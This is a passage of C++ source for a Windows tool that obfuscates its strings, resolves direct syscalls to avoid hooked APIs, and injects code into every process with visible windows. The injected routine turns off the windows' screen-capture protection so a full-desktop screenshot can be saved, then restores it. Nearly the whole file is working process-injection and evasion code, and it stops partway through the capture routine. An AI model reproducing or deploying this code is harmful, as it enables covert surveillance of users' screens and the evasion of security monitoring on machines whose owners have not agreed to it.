#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include <vector>
#include <string>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <map>
#include <cstring>

using namespace Gdiplus;

constexpr unsigned char OBF_SEED = (__TIME__[7] ^ __TIME__[4] ^ __TIME__[1]) & 0xFF;

constexpr unsigned char GenKey(unsigned char idx, unsigned char seed) {
    return ((seed + idx) ^ ((idx * 7) + 0x41)) & 0xFF;
}

template<size_t N, unsigned char SEED>
struct ObfString {
    unsigned char data[N];

    constexpr explicit ObfString(const char(&str)[N]) : data{} {
        for (unsigned char i = 0; i < N; ++i) {
            data[i] = static_cast<unsigned char>(str[i]) ^ GenKey(i, SEED);
        }
    }

    template<size_t M>
    bool deobfuscate(char (&out)[M]) const {
        if (M < N) return false;
        for (unsigned char i = 0; i < N; ++i) {
            out[i] = static_cast<char>(data[i] ^ GenKey(i, SEED));
        }
        return true;
    }


    [[nodiscard]] std::string str() const {
        char buf[N];
        deobfuscate(buf);
        return std::string(buf);
    }
};

#define MAKE_OBF(str) ObfString<sizeof(str), OBF_SEED>(str)
#define DECR_STR(obf) (obf).str()

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T Size;
    union {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

extern "C" {
    extern DWORD g_SysNtOpenProcess;
    extern DWORD g_SysNtAllocateVirtualMemory;
    extern DWORD g_SysNtWriteVirtualMemory;
    extern DWORD g_SysNtFreeVirtualMemory;
    extern DWORD g_SysNtCreateThreadEx;
    extern DWORD g_SysNtClose;
    extern DWORD g_SysNtQueryInformationProcess;
    extern DWORD g_SysNtWaitForSingleObject;
    extern DWORD g_SysNtProtectVirtualMemory;
}

extern "C" {
    NTSTATUS SyscallNtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    );

    NTSTATUS SyscallNtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    NTSTATUS SyscallNtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToWrite,
        PSIZE_T NumberOfBytesWritten
    );

    NTSTATUS SyscallNtFreeVirtualMemory(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        PSIZE_T RegionSize,
        ULONG FreeType
    );

    NTSTATUS SyscallNtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PPS_ATTRIBUTE_LIST AttributeList
    );

    NTSTATUS SyscallNtClose(HANDLE Handle);

    NTSTATUS SyscallNtQueryInformationProcess(
        HANDLE ProcessHandle,
        ULONG ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    NTSTATUS SyscallNtWaitForSingleObject(
        HANDLE Handle,
        BOOLEAN Alertable,
        PLARGE_INTEGER Timeout
    );

    NTSTATUS SyscallNtProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );
}

static HMODULE GetNtdllHandle() {
    static HMODULE hNtdll = nullptr;
    if (!hNtdll) {
        static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
        hNtdll = GetModuleHandleA(DECR_STR(obfNtdll).c_str());
    }
    return hNtdll;
}

static DWORD GetSyscallNumber(const char* funcName) {
    HMODULE hNtdll = GetNtdllHandle();
    if (!hNtdll) return 0;

    BYTE* pBase = (BYTE*)hNtdll;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;
    BYTE* pEnd = pBase + pNt->OptionalHeader.SizeOfImage;

    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, funcName);
    if (!pFunc) return 0;

    // mov r10, rcx; mov eax, <SSN> -> 4C 8B D1 B8 XX XX 00 00
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
        return *(DWORD*)(pFunc + 4);
    }

    constexpr int STUB_SIZE = 32;
    constexpr int MAX_SEARCH = 500;

    for (int i = 1; i <= MAX_SEARCH; i++) {
        BYTE* neighbor = pFunc - (i * STUB_SIZE);
        if (neighbor < pBase || neighbor + 8 > pEnd) break;
        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
            return *(DWORD*)(neighbor + 4) + i;
        }
    }

    for (int i = 1; i <= MAX_SEARCH; i++) {
        BYTE* neighbor = pFunc + (i * STUB_SIZE);
        if (neighbor + 8 > pEnd) break;
        if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
            return *(DWORD*)(neighbor + 4) - i;
        }
    }

    return 0;
}

template<size_t N, unsigned char K>
static DWORD GetSyscallNumberObf(const ObfString<N, K>& obf) {
    char buf[N];
    obf.deobfuscate(buf);
    return GetSyscallNumber(buf);
}

static bool InitializeSyscalls() {
    static constexpr auto obfNtOpenProcess = MAKE_OBF("NtOpenProcess");
    static constexpr auto obfNtAllocateVirtualMemory = MAKE_OBF("NtAllocateVirtualMemory");
    static constexpr auto obfNtWriteVirtualMemory = MAKE_OBF("NtWriteVirtualMemory");
    static constexpr auto obfNtFreeVirtualMemory = MAKE_OBF("NtFreeVirtualMemory");
    static constexpr auto obfNtCreateThreadEx = MAKE_OBF("NtCreateThreadEx");
    static constexpr auto obfNtClose = MAKE_OBF("NtClose");
    static constexpr auto obfNtQueryInformationProcess = MAKE_OBF("NtQueryInformationProcess");
    static constexpr auto obfNtWaitForSingleObject = MAKE_OBF("NtWaitForSingleObject");
    static constexpr auto obfNtProtectVirtualMemory = MAKE_OBF("NtProtectVirtualMemory");

    g_SysNtOpenProcess = GetSyscallNumberObf(obfNtOpenProcess);
    g_SysNtAllocateVirtualMemory = GetSyscallNumberObf(obfNtAllocateVirtualMemory);
    g_SysNtWriteVirtualMemory = GetSyscallNumberObf(obfNtWriteVirtualMemory);
    g_SysNtFreeVirtualMemory = GetSyscallNumberObf(obfNtFreeVirtualMemory);
    g_SysNtCreateThreadEx = GetSyscallNumberObf(obfNtCreateThreadEx);
    g_SysNtClose = GetSyscallNumberObf(obfNtClose);
    g_SysNtQueryInformationProcess = GetSyscallNumberObf(obfNtQueryInformationProcess);
    g_SysNtWaitForSingleObject = GetSyscallNumberObf(obfNtWaitForSingleObject);
    g_SysNtProtectVirtualMemory = GetSyscallNumberObf(obfNtProtectVirtualMemory);

    if (g_SysNtOpenProcess == 0 || g_SysNtAllocateVirtualMemory == 0 ||
        g_SysNtWriteVirtualMemory == 0 || g_SysNtFreeVirtualMemory == 0 ||
        g_SysNtCreateThreadEx == 0 || g_SysNtClose == 0 ||
        g_SysNtWaitForSingleObject == 0 || g_SysNtProtectVirtualMemory == 0) {
        return false;
    }

    return true;
}

static HANDLE NtOpenProcessDirect(DWORD pid, ACCESS_MASK desiredAccess) {
    HANDLE hProcess = nullptr;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;

    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = nullptr;

    NTSTATUS status = SyscallNtOpenProcess(&hProcess, desiredAccess, &oa, &cid);
    return NT_SUCCESS(status) ? hProcess : nullptr;
}

static PVOID NtAllocateMemoryDirect(HANDLE hProcess, SIZE_T size, ULONG protect) {
    PVOID baseAddr = nullptr;
    SIZE_T regionSize = size;

    NTSTATUS status = SyscallNtAllocateVirtualMemory(
        hProcess, &baseAddr, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, protect
    );

    return NT_SUCCESS(status) ? baseAddr : nullptr;
}

static bool NtWriteMemoryDirect(HANDLE hProcess, PVOID dest, PVOID src, SIZE_T size) {
    SIZE_T written = 0;
    NTSTATUS status = SyscallNtWriteVirtualMemory(hProcess, dest, src, size, &written);
    return NT_SUCCESS(status) && written == size;
}

static void NtFreeMemoryDirect(HANDLE hProcess, PVOID addr) {
    PVOID baseAddr = addr;
    SIZE_T regionSize = 0;
    SyscallNtFreeVirtualMemory(hProcess, &baseAddr, &regionSize, MEM_RELEASE);
}

static HANDLE NtCreateThreadDirect(HANDLE hProcess, PVOID startAddr, PVOID param) {
    HANDLE hThread = nullptr;

    NTSTATUS status = SyscallNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        nullptr,          // ObjectAttributes
        hProcess,
        startAddr,
        param,
        0,                // CreateFlags (0 = start immediately)
        0,                // ZeroBits
        0,                // StackSize (0 = default)
        0,                // MaximumStackSize (0 = default)
        nullptr           // AttributeList
    );

    return NT_SUCCESS(status) ? hThread : nullptr;
}

static void NtCloseDirect(HANDLE handle) {
    if (handle && handle != INVALID_HANDLE_VALUE) {
        SyscallNtClose(handle);
    }
}

static bool NtProtectMemoryDirect(HANDLE hProcess, PVOID addr, SIZE_T size, ULONG newProtect, PULONG oldProtect) {
    PVOID baseAddr = addr;
    SIZE_T regionSize = size;
    NTSTATUS status = SyscallNtProtectVirtualMemory(hProcess, &baseAddr, &regionSize, newProtect, oldProtect);
    return NT_SUCCESS(status);
}

static DWORD NtWaitDirect(HANDLE handle, DWORD milliseconds) {

    LARGE_INTEGER timeout;
    timeout.QuadPart = -((LONGLONG)milliseconds * 10000);

    NTSTATUS status = SyscallNtWaitForSingleObject(handle, FALSE, &timeout);

    if (status == 0x00000000) return WAIT_OBJECT_0;      // STATUS_SUCCESS
    if (status == 0x00000102) return WAIT_TIMEOUT;       // STATUS_TIMEOUT
    if (status == 0x00000080) return WAIT_ABANDONED;     // STATUS_ABANDONED
    return WAIT_FAILED;
}

#ifdef __GNUC__
#define SEC_REMOTE __attribute__((section(".remote")))
#define FUNC_ATTRS __attribute__((no_instrument_function, optimize("O0"), force_align_arg_pointer))
#else
#pragma section(".remote", read, execute)
#define SEC_REMOTE __declspec(allocate(".remote"))
#define FUNC_ATTRS
#pragma runtime_checks( "", off )
#pragma optimize( "", off )
#pragma check_stack( off )
#endif

typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL(WINAPI* pReleaseSemaphore)(HANDLE, LONG, LPLONG);
typedef HMODULE(WINAPI* pGetModuleHandleA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);

typedef struct _PEB_LDR_DATA_FULL {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_FULL, *PPEB_LDR_DATA_FULL;

typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_FULL, *PLDR_DATA_TABLE_ENTRY_FULL;

typedef struct _PEB_FULL {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA_FULL Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
} PEB_FULL, *PPEB_FULL;

typedef NTSTATUS(NTAPI* pRtlEnterCriticalSection)(PRTL_CRITICAL_SECTION);
typedef NTSTATUS(NTAPI* pRtlLeaveCriticalSection)(PRTL_CRITICAL_SECTION);

#define MAX_HWNDS_PER_PID 256
#define MAX_FUNC_NAME 128

struct INJECTION_DATA {
    DWORD count;
    HWND hwnds[MAX_HWNDS_PER_PID];
    DWORD originalAffinities[MAX_HWNDS_PER_PID];

    HANDLE hGlobalTriggerEvent;
    HANDLE hReadySemaphore;

    char libName[MAX_FUNC_NAME];
    char setFuncName[MAX_FUNC_NAME];
    char getFuncName[MAX_FUNC_NAME];
    char kernel32Name[MAX_FUNC_NAME];
    char ntdllName[MAX_FUNC_NAME];
    char waitFuncName[MAX_FUNC_NAME];
    char releaseFuncName[MAX_FUNC_NAME];
    char getModuleFuncName[MAX_FUNC_NAME];
    char getProcFuncName[MAX_FUNC_NAME];
    char enterCritSecName[MAX_FUNC_NAME];
    char leaveCritSecName[MAX_FUNC_NAME];
};

template<size_t N>
static bool SafeCopyString(char (&dest)[N], const std::string& src) {
    if (src.length() >= N) return false;
    memcpy(dest, src.c_str(), src.length() + 1);
    return true;
}

struct RemoteContext {
    HANDLE hProcess;
    HANDLE hThread;
    LPVOID pRemoteData;
    LPVOID pRemoteCode;
    DWORD pid;
};

#pragma runtime_checks( "", off )
#pragma optimize( "", off )
#pragma check_stack( off )

extern "C" SEC_REMOTE FUNC_ATTRS
DWORD __stdcall RemoteThreadProc(LPVOID lpParameter) {
    INJECTION_DATA* pData = (INJECTION_DATA*)lpParameter;

#if defined(_M_X64) || defined(__x86_64__)
    PPEB_FULL pPeb = (PPEB_FULL)__readgsqword(0x60);
#else
    PPEB_FULL pPeb = (PPEB_FULL)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA_FULL pLdr = pPeb->Ldr;
    PRTL_CRITICAL_SECTION pLock = pPeb->FastPebLock;

    HMODULE hNtdll = nullptr;
    {
        PLIST_ENTRY pListHead = &pLdr->InLoadOrderModuleList;
        PLIST_ENTRY pListEntry = pListHead->Flink;
        int count = 0;
        while (pListEntry != pListHead && count < 3) {
            PLDR_DATA_TABLE_ENTRY_FULL pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY_FULL, InLoadOrderLinks);
            if (pEntry->BaseDllName.Buffer && pEntry->DllBase) {
                const WCHAR* ws = pEntry->BaseDllName.Buffer;
                const char* s = pData->ntdllName;
                bool match = true;
                while (*ws && *s) {
                    char c1 = (char)*ws, c2 = *s;
                    if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                    if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                    if (c1 != c2) { match = false; break; }
                    ws++; s++;
                }
                if (match && *ws == 0 && *s == 0) {
                    hNtdll = (HMODULE)pEntry->DllBase;
                    break;
                }
            }
            pListEntry = pListEntry->Flink;
            count++;
        }
    }
    if (!hNtdll) return 1;

    pRtlEnterCriticalSection fnEnterCS = nullptr;
    pRtlLeaveCriticalSection fnLeaveCS = nullptr;
    {
        BYTE* pBase = (BYTE*)hNtdll;
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 1;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE) return 1;
        DWORD exportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!exportRva) return 1;
        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportRva);
        DWORD* pNames = (DWORD*)(pBase + pExport->AddressOfNames);
        WORD* pOrdinals = (WORD*)(pBase + pExport->AddressOfNameOrdinals);
        DWORD* pFunctions = (DWORD*)(pBase + pExport->AddressOfFunctions);

        for (DWORD i = 0; i < pExport->NumberOfNames && (!fnEnterCS || !fnLeaveCS); i++) {
            const char* name = (const char*)(pBase + pNames[i]);
            const char* targets[2] = { pData->enterCritSecName, pData->leaveCritSecName };
            FARPROC* results[2] = { (FARPROC*)&fnEnterCS, (FARPROC*)&fnLeaveCS };
            for (int t = 0; t < 2; t++) {
                if (*results[t]) continue;
                const char* s1 = name;
                const char* s2 = targets[t];
                bool match = true;
                while (*s1 && *s2) {
                    char c1 = *s1, c2 = *s2;
                    if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                    if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                    if (c1 != c2) { match = false; break; }
                    s1++; s2++;
                }
                if (match && *s1 == 0 && *s2 == 0) {
                    *results[t] = (FARPROC)(pBase + pFunctions[pOrdinals[i]]);
                }
            }
        }
    }
    if (!fnEnterCS || !fnLeaveCS) return 1;

    HMODULE hKernel32 = nullptr;
    fnEnterCS(pLock);
    {
        PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
        PLIST_ENTRY pListEntry = pListHead->Flink;
        while (pListEntry != pListHead) {
            PLDR_DATA_TABLE_ENTRY_FULL pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY_FULL, InMemoryOrderLinks);
            if (pEntry->BaseDllName.Buffer && pEntry->DllBase) {
                const WCHAR* ws = pEntry->BaseDllName.Buffer;
                const char* s = pData->kernel32Name;
                bool match = true;
                while (*ws && *s) {
                    char c1 = (char)*ws, c2 = *s;
                    if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                    if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                    if (c1 != c2) { match = false; break; }
                    ws++; s++;
                }
                if (match && *ws == 0 && *s == 0) {
                    hKernel32 = (HMODULE)pEntry->DllBase;
                    break;
                }
            }
            pListEntry = pListEntry->Flink;
        }
    }
    fnLeaveCS(pLock);
    if (!hKernel32) return 1;

    pGetModuleHandleA fnGetModuleHandleA = nullptr;
    pGetProcAddress fnGetProcAddress = nullptr;
    pWaitForSingleObject fnWaitForSingleObject = nullptr;
    pReleaseSemaphore fnReleaseSemaphore = nullptr;
    {
        BYTE* pBase = (BYTE*)hKernel32;
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 1;

        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE) return 1;

        DWORD exportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!exportRva) return 1;

        PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportRva);
        DWORD* pNames = (DWORD*)(pBase + pExport->AddressOfNames);
        WORD* pOrdinals = (WORD*)(pBase + pExport->AddressOfNameOrdinals);
        DWORD* pFunctions = (DWORD*)(pBase + pExport->AddressOfFunctions);

        const char* targets[4] = { pData->getModuleFuncName, pData->getProcFuncName, pData->waitFuncName, pData->releaseFuncName };
        FARPROC* results[4] = { (FARPROC*)&fnGetModuleHandleA, (FARPROC*)&fnGetProcAddress, (FARPROC*)&fnWaitForSingleObject, (FARPROC*)&fnReleaseSemaphore };

        for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
            const char* name = (const char*)(pBase + pNames[i]);
            
            for (int t = 0; t < 4; t++) {
                if (*results[t]) continue;
                const char* s1 = name;
                const char* s2 = targets[t];
                bool match = true;
                while (*s1 && *s2) {
                    char c1 = *s1, c2 = *s2;
                    if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                    if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                    if (c1 != c2) { match = false; break; }
                    s1++; s2++;
                }
                if (match && *s1 == 0 && *s2 == 0) {
                    *results[t] = (FARPROC)(pBase + pFunctions[pOrdinals[i]]);
                }
            }
        }
    }
    if (!fnGetModuleHandleA || !fnGetProcAddress || !fnWaitForSingleObject || !fnReleaseSemaphore) return 1;

    typedef DWORD(NTAPI* pSetWDA)(HWND, DWORD);
    typedef DWORD(NTAPI* pGetWDA)(HWND, DWORD*);

    pSetWDA fnSetWDA = nullptr;
    pGetWDA fnGetWDA = nullptr;

    HMODULE hLib = fnGetModuleHandleA(pData->libName);
    if (hLib) {
        fnSetWDA = (pSetWDA)fnGetProcAddress(hLib, pData->setFuncName);
        fnGetWDA = (pGetWDA)fnGetProcAddress(hLib, pData->getFuncName);
    }

    if (!fnSetWDA || !fnGetWDA) return 1;

    for (DWORD i = 0; i < pData->count; i++) {
        pData->originalAffinities[i] = 0;

        if (!pData->hwnds[i]) continue;

        DWORD currentAffinity = 0;
        if (!fnGetWDA(pData->hwnds[i], &currentAffinity)) continue;
        if (currentAffinity == 0) continue;

        if (!fnSetWDA(pData->hwnds[i], 0)) continue;

        DWORD verifyAffinity = 0;
        if (!fnGetWDA(pData->hwnds[i], &verifyAffinity)) continue;
        if (verifyAffinity != 0) continue;

        pData->originalAffinities[i] = currentAffinity;
    }

    if (pData->hReadySemaphore) {
        fnReleaseSemaphore(pData->hReadySemaphore, 1, nullptr);
    }

    fnWaitForSingleObject(pData->hGlobalTriggerEvent, 10000);

    for (DWORD i = 0; i < pData->count; i++) {
        if (pData->originalAffinities[i] != 0) {
            fnSetWDA(pData->hwnds[i], pData->originalAffinities[i]);
        }
    }

    return 0;
}

#ifndef __GNUC__
#pragma runtime_checks( "", restore )
#pragma optimize( "", on )
#pragma check_stack( on )
#endif

size_t GetRemoteSectionSize() {
    HMODULE hMod = GetModuleHandle(nullptr);
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strncmp((char*)pSectionHeader[i].Name, ".remote", 8) == 0) {
            size_t size = pSectionHeader[i].Misc.VirtualSize;
            return (size + 4095) & ~4095;
        }
    }
    return 0;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (!pImageCodecInfo) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

void SaveScreenshot() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << "screen_" << std::put_time(std::localtime(&in_time_t), "%Y-%m-%d_%H-%M-%S") << ".jpg";
    std::string fileNameStr = ss.str();
    std::wstring fileNameW(fileNameStr.begin(), fileNameStr.end());

    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hdcScreen = GetDC(nullptr);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, w, h);
    SelectObject(hdcMemDC, hbm);

    BitBlt(hdcMemDC, 0, 0, w, h, hdcScreen, x, y, SRCCOPY);

    Bitmap bitmap(hbm, nullptr);
    CLSID clsid;
    if (GetEncoderClsid(L"image/jpeg", &clsid) != -1) {
        bitmap.Save(fileNameW.c_str(), &clsid, nullptr);
        std::cout << "[+] Saved: " << fileNameStr << std::endl;
    }

    DeleteObject(hbm);
    DeleteDC(hdcMemDC);
    ReleaseDC(nullptr, hdcScreen);
}

std::map<DWORD, std::vector<HWND>> g_ProcessWindows;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (!IsWindowVisible(hwnd)) return TRUE;
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid != GetCurrentProcessId()) {
        if (g_ProcessWindows[pid].size() < MAX_HWNDS_PER_PID) {
            g_ProcessWindows[pid].push_back(hwnd);
        }
    }
    return TRUE;
}

class HandleGuard {
    HANDLE m_handle;
public:
    explicit HandleGuard(HANDLE h = nullptr) : m_handle(h) {}
    ~HandleGuard() { if (m_handle) CloseHandle(m_handle); }
    HandleGuard(const HandleGuard&) = delete;
    HandleGuard& operator=(const HandleGuard&) = delete;
    HandleGuard(HandleGuard&& other) noexcept : m_handle(other.m_handle) { other.m_handle = nullptr; }
    HandleGuard& operator=(HandleGuard&& other) noexcept {
        if (this != &other) {
            if (m_handle) CloseHandle(m_handle);
            m_handle = other.m_handle;
            other.m_handle = nullptr;
        }
        return *this;
    }
    [[nodiscard]] HANDLE get() const { return m_handle; }
    explicit operator bool() const { return m_handle != nullptr; }
};

void Capture() {
    std::cout << "[*] Scanning desktop..." << std::endl;
    g_ProcessWindows.clear();
    EnumWindows(EnumWindowsProc, 0);

    HandleGuard hGlobalTrigger(CreateEventA(nullptr, TRUE, FALSE, nullptr));
    if (!hGlobalTrigger) {
        std::cerr << "[!] Failed to create trigger event" << std::endl;
        return;
    }

    HandleGuard hReadySemaphore(CreateSemaphoreA(nullptr, 0, 1000, nullptr));
    if (!hReadySemaphore) {
        std::cerr << "[!] Failed to create ready semaphore" << std::endl;
        return;
    }

    std::vector<RemoteContext> activeInjections;

    size_t sectionSize = GetRemoteSectionSize();
    if (sectionSize == 0) {
        std::cerr << "[!] .remote section not found" << std::endl;
        return;
    }

    std::cout << "[*] Injecting code (Size: " << sectionSize << " bytes) using direct syscalls..." << std::endl;

    for (auto const& [pid, hwnds] : g_ProcessWindows) {
        HANDLE hProcess = NtOpenProcessDirect(pid, PROCESS_ALL_ACCESS);
        if (!hProcess) continue;

        INJECTION_DATA data = { 0 };
        data.count = hwnds.size() < MAX_HWNDS_PER_PID ? (DWORD)hwnds.size() : MAX_HWNDS_PER_PID;
        for (size_t i = 0; i < data.count; i++) data.hwnds[i] = hwnds[i];

        static constexpr auto obfKernel32 = MAKE_OBF("kernel32.dll");
        static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
        static constexpr auto obfGetModule = MAKE_OBF("GetModuleHandleA");
        static constexpr auto obfGetProc = MAKE_OBF("GetProcAddress");
        static constexpr auto obfWait = MAKE_OBF("WaitForSingleObject");
        static constexpr auto obfRelease = MAKE_OBF("ReleaseSemaphore");
        static constexpr auto obfEnterCS = MAKE_OBF("RtlEnterCriticalSection");
        static constexpr auto obfLeaveCS = MAKE_OBF("RtlLeaveCriticalSection");

        if (!SafeCopyString(data.kernel32Name, DECR_STR(obfKernel32)) ||
            !SafeCopyString(data.ntdllName, DECR_STR(obfNtdll)) ||
            !SafeCopyString(data.getModuleFuncName, DECR_STR(obfGetModule)) ||
            !SafeCopyString(data.getProcFuncName, DECR_STR(obfGetProc)) ||
            !SafeCopyString(data.waitFuncName, DECR_STR(obfWait)) ||
            !SafeCopyString(data.releaseFuncName, DECR_STR(obfRelease)) ||
            !SafeCopyString(data.enterCritSecName, DECR_STR(obfEnterCS)) ||
            !SafeCopyString(data.leaveCritSecName, DECR_STR(obfLeaveCS))) {
            NtCloseDirect(hProcess);
            continue;
        }

        if (!DuplicateHandle(GetCurrentProcess(), hGlobalTrigger.get(), hProcess, &data.hGlobalTriggerEvent,
            0, FALSE, DUPLICATE_SAME_ACCESS)) {
            NtCloseDirect(hProcess);
            continue;
        }

        if (!DuplicateHandle(GetCurrentProcess(), hReadySemaphore.get(), hProcess, &data.hReadySemaphore,
            SEMAPHORE_MODIFY_STATE | SYNCHRONIZE, FALSE, 0)) {
            NtCloseDirect(hProcess);
            continue;
        }

        static constexpr auto obfWin32u = MAKE_OBF("win32u.dll");
